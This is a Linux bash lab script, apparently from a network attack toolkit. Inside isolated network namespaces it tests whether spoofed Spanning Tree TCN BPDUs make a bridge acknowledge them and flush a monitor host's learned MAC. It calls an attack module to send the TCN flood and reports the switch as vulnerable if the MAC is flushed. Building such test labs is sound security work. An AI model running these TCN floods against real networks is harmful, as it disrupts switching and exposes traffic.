#!/usr/bin/env bash
# Isolated TCN spoofing lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   root --(veth)-- [switch: br0 with STP, port sw-r]
#                   [switch port sw-a] --(veth)-- attacker
#                   [switch port sw-m] --(veth)-- monitor
#
#   root:     the real root bridge (priority 8192). The switch's root port stays sw-r.
#   switch:   a bridge running 802.1D Spanning Tree (kernel STP). sw-a is a designated port,
#             because the attacker is a leaf.
#   attacker: sends topology change notifications (TCN BPDUs) on sw-a.
#   monitor:  a host whose MAC the switch learns on sw-m.
#
#   Phase 1 (baseline): the monitor's MAC is learned.
#   Phase 2 (control): the same time with no TCN. The MAC should stay learned.
#   Phase 3: the attacker sends TCNs for 15 s. The switch should acknowledge them
#            (configuration BPDUs with the TCA flag reach the attacker), detect a topology
#            change and may flush the monitor's MAC.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/tcn_spoofing_lab.sh
#   sudo TCNS=30 scripts/lab/tcn_spoofing_lab.sh
#
# Requirements: iproute2 (ip, bridge), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
TCNS="${TCNS:-30}"          # TCNs; 30 x 0.5 s = 15 s
INTERVAL=0.5
SETTLE_SECONDS=12
ATTACKER_MAC="02:00:00:00:00:30"
MONITOR_MAC="02:00:00:00:00:40"
WORK="$(mktemp -d)"

stop_lab() {
    for ns in monitor attacker root switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add switch
ip netns add root
ip netns add attacker
ip netns add monitor

ip link add r-sw type veth peer name sw-r
ip link set r-sw netns root
ip link set sw-r netns switch

ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip link add m-sw type veth peer name sw-m
ip link set m-sw netns monitor
ip link set sw-m netns switch

ip netns exec switch ip link add br0 type bridge stp_state 1 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec switch ip link set br0 up
for port in sw-a sw-r sw-m; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec root ip link add rb0 type bridge stp_state 1 priority 8192 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec root ip link set rb0 up
ip netns exec root ip link set r-sw master rb0
ip netns exec root ip link set r-sw up

ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-sw up
ip netns exec monitor ip link set m-sw address "$MONITOR_MAC"
ip netns exec monitor ip link set m-sw up

root_port_name() {
    local number port port_no
    number="$(ip netns exec switch ip -d link show br0 | grep -o 'root_port [0-9]*' | awk '{print $2}')"
    if [[ "$number" == "0" || -z "$number" ]]; then
        echo "none"
        return
    fi
    for port in sw-a sw-r sw-m; do
        port_no="$(ip netns exec switch ip -d link show "$port" | grep -o 'port_no 0x[0-9a-f]*' | awk '{print $2}')"
        if (( port_no == number )); then
            echo "$port"
            return
        fi
    done
    echo "port $number"
}

monitor_entry() {
    if ip netns exec switch bridge fdb show br br0 | grep -qi "$MONITOR_MAC"; then
        echo "learned"
    else
        echo "flushed"
    fi
}

tc_detected() {
    ip netns exec switch ip -d link show br0 | grep -o 'topology_change_detected [0-9]*' | awk '{print $2}'
}

LEARN_CODE='
from scapy.all import Ether, Raw, sendp
sendp(Ether(src="'"$MONITOR_MAC"'", dst="ff:ff:ff:ff:ff:ff", type=0x88B5) / Raw(b"\x00" * 46), iface="m-sw", verbose=False)
'

# Counts the acknowledgments the switch sends back: configuration BPDUs with the TCA flag.
SNIFF_CODE='
import os
from scapy.all import sniff
count = 0
def cb(pkt):
    global count
    raw = bytes(pkt)
    if raw[0:6] == bytes.fromhex("0180c2000000") and raw[14:17] == bytes.fromhex("424203"):
        # Body starts at byte 17: protocol ID (2), version (1), type (1), flags (1).
        if raw[20] == 0x00 and raw[21] & 0x80:
            count += 1
sniff(iface="a-sw", prn=cb, timeout=int(os.environ["SNIFF_SECONDS"]), store=False)
open(os.environ["OUT"], "w").write(str(count))
'

TCN_CODE='
import os
from macabre.attacks.tcn_spoofing import TcnSpoofingConfig, run_tcn_spoofing
import threading
stats = run_tcn_spoofing(
    TcnSpoofingConfig(iface="a-sw", count=int(os.environ["TCNS"]), interval=float(os.environ["INTERVAL"])),
    threading.Event(),
    lambda _: None,
)
print(f"Attacker: sent {stats.frames} TCNs from {stats.sender_mac}")
'

echo "Waiting ${SETTLE_SECONDS}s for the real root to be elected"
sleep "$SETTLE_SECONDS"
ip netns exec monitor env PYTHONPATH="$ROOT/src" "$PY" -c "$LEARN_CODE"
sleep 1

echo "Phase 1: baseline"
BASE_PORT="$(root_port_name)"
BASE_MAC="$(monitor_entry)"
echo "  root port: $BASE_PORT   monitor MAC: $BASE_MAC   TC detected flag: $(tc_detected)"
echo

echo "Phase 2: control, 8 s with no TCN"
sleep 8
CONTROL_MAC="$(monitor_entry)"
echo "  monitor MAC: $CONTROL_MAC   TC detected flag: $(tc_detected)"
echo

echo "Phase 3: attacker sends $TCNS TCNs every ${INTERVAL}s, and sniffs for the switch's acknowledgments"
ip netns exec attacker env PYTHONPATH="$ROOT/src" SNIFF_SECONDS=$(( TCNS / 2 + 3 )) OUT="$WORK/tca" "$PY" -c "$SNIFF_CODE" &
SNIFF_PID=$!
sleep 1
ip netns exec attacker env PYTHONPATH="$ROOT/src" TCNS="$TCNS" INTERVAL="$INTERVAL" "$PY" -c "$TCN_CODE" &
TCN_PID=$!
last=0
FLOOD_MAC="learned"
FLOOD_TC_MAX=0
for at in 2 8 14; do
    sleep $(( at - last ))
    last=$at
    sample_mac="$(monitor_entry)"
    sample_tc="$(tc_detected)"
    echo "  t+${at}s monitor MAC: $sample_mac   TC detected flag: $sample_tc"
    [[ "$sample_mac" == "flushed" ]] && FLOOD_MAC="flushed"
    (( sample_tc > FLOOD_TC_MAX )) && FLOOD_TC_MAX=$sample_tc
done
wait "$TCN_PID"
wait "$SNIFF_PID"
TCA_COUNT="$(cat "$WORK/tca")"
echo "  acknowledgments (TCA) received by the attacker: $TCA_COUNT"
echo "  root port at the end: $(root_port_name)"
echo

if [[ "$BASE_PORT" == "sw-r" && "$BASE_MAC" == "learned" ]]; then
    echo "Baseline: root port on the real root (sw-r) and the monitor's MAC learned. OK"
else
    echo "Baseline: root port $BASE_PORT, monitor MAC $BASE_MAC. Result unreliable."
fi
if [[ "$CONTROL_MAC" == "learned" ]]; then
    echo "Control: the monitor's MAC stayed learned with no TCN."
else
    echo "Control: the monitor's MAC was flushed with no TCN. Result unreliable."
fi
if (( TCA_COUNT > 0 )); then
    echo "Acknowledged: the switch sent $TCA_COUNT TCA acknowledgments to the attacker. It accepted the TCNs."
else
    echo "Acknowledged: the switch sent no TCA acknowledgments. It did not accept the TCNs on this port."
fi
if (( FLOOD_TC_MAX > 0 )); then
    echo "Topology change: the switch detected a topology change from the TCNs (flag set during the flood)."
else
    echo "Topology change: the switch did not detect a topology change."
fi
if [[ "$FLOOD_MAC" == "flushed" ]]; then
    echo "Flush: the TCNs flushed the monitor's MAC from the switch's table. Vulnerable."
else
    echo "Flush: the monitor's MAC stayed learned for the whole flood."
fi
